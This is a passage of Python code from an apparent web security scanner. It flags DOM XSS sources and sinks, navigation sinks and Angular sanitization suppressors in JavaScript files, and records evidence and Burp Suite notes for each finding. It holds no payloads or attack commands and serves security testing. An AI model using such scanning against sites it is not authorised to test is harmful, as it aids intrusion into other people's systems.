                    surface_type = "Angular Sanitization Suppressor",
                    parameters   = [],
                    confidence   = ConfidenceLevel.MEDIUM,
                    evidence     = supp_evidence,
                    burp_notes   = _BURP_NOTES_ANGULAR_SANITIZER_SUPPRESSOR,
                )
                supp_ev = [
                    Evidence(
                        evidence_type = EvidenceType.AST,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "Angular sanitization suppressor weakens schema-level protection",
                        details       = ", ".join(suppressors),
                    ),
                ]
                self._emit_evidence(
                    evidence     = supp_ev,
                    surface_type = "Angular Sanitization Suppressor",
                    endpoint     = ep_url,
                    method       = "GET",
                    parameter    = suppressors[0] if suppressors else "",
                    notes        = _BURP_NOTES_ANGULAR_SANITIZER_SUPPRESSOR,
                )

            # Skip sink/source analysis if no sinks present
            if not all_sinks:
                continue

            if sources and strong_sinks:
                # Strong sink + user-controlled source = real DOM XSS surface
                evidence = [
                    f"DOM sinks: {', '.join(strong_sinks[:4])}",
                    f"User-controlled sources: {', '.join(sources[:3])}",
                    "Source-to-sink path present - manual trace required to confirm exploitability",
                ]
                fw_hits = [k for k, v in frameworks.items() if v]
                if fw_hits:
                    evidence.append(f"Framework-specific sinks: {', '.join(fw_hits)}")

                self._candidate(
                    endpoint     = synthetic_ep,
                    surface_type = "DOM XSS Surface",
                    parameters   = [],
                    confidence   = ConfidenceLevel.HIGH,
                    evidence     = evidence,
                    burp_notes   = _sink_burp_notes(strong_sinks, frameworks),
                )
                dom_ev = [
                    Evidence(
                        evidence_type = EvidenceType.DOM,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "User-controlled DOM sources",
                        details       = ", ".join(sources[:3]),
                    ),
                    Evidence(
                        evidence_type = EvidenceType.STATIC_JS,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "Strong DOM sinks in same file as user-controlled sources",
                        details       = ", ".join(strong_sinks[:4]),
                    ),
                ]
                self._emit_evidence(
                    evidence     = dom_ev,
                    surface_type = "DOM XSS Surface",
                    endpoint     = ep_url,
                    method       = "GET",
                    parameter    = strong_sinks[0] if strong_sinks else "",
                    notes        = _sink_burp_notes(strong_sinks, frameworks),
                )

            elif sources and nav_sinks:
                # Navigation sink + source = DOM open redirect / javascript: XSS
                evidence = [
                    f"Navigation sinks: {', '.join(nav_sinks[:3])}",
                    f"User-controlled sources: {', '.join(sources[:3])}",
                    "javascript: URI injection may be possible if href/src is set from user input",
                ]
                self._candidate(
                    endpoint     = synthetic_ep,
                    surface_type = "DOM XSS via Navigation Sink",
                    parameters   = [],
                    confidence   = ConfidenceLevel.MEDIUM,
                    evidence     = evidence,
                    burp_notes   = _BURP_NOTES_NAV_SINK,
                )
                nav_ev = [
                    Evidence(
                        evidence_type = EvidenceType.DOM,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "User-controlled sources feeding navigation sink",
                        details       = ", ".join(sources[:3]),
                    ),
                    Evidence(
                        evidence_type = EvidenceType.STATIC_JS,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "Navigation sinks - javascript: URI injection potential",
                        details       = ", ".join(nav_sinks[:3]),
                    ),
                ]
                self._emit_evidence(
                    evidence     = nav_ev,
                    surface_type = "DOM XSS via Navigation Sink",
                    endpoint     = ep_url,
                    method       = "GET",
                    parameter    = nav_sinks[0] if nav_sinks else "",
                    notes        = _BURP_NOTES_NAV_SINK,
                )

            elif strong_sinks:
                # Sink only - no confirmed user-controlled source in this file
                fw_hits = [k for k, v in frameworks.items() if v]
                evidence_lines = [
                    f"DOM sinks: {', '.join(strong_sinks[:4])} - no user-controlled source detected in same file",
                ]
                if fw_hits:
                    evidence_lines.append(f"Framework sinks detected: {', '.join(fw_hits)} - review usage carefully")

                self._candidate(
                    endpoint     = synthetic_ep,
                    surface_type = "DOM Sink",
                    parameters   = [],
                    confidence   = ConfidenceLevel.LOW,
                    evidence     = evidence_lines,
                    burp_notes   = _BURP_NOTES_DOM_SINK,
                )
                sink_ev = [
                    Evidence(
                        evidence_type = EvidenceType.STATIC_JS,
                        source        = "static",
                        asset         = js.url or "",
                        context       = "DOM sink present - no user-controlled source confirmed in this file",
                        details       = ", ".join(strong_sinks[:4]),
                    ),
                ]
                self._emit_evidence(
                    evidence     = sink_ev,
                    surface_type = "DOM Sink",
                    endpoint     = ep_url,
                    method       = "GET",
                    parameter    = strong_sinks[0] if strong_sinks else "",
                    notes        = _BURP_NOTES_DOM_SINK,
                )

        return self._results
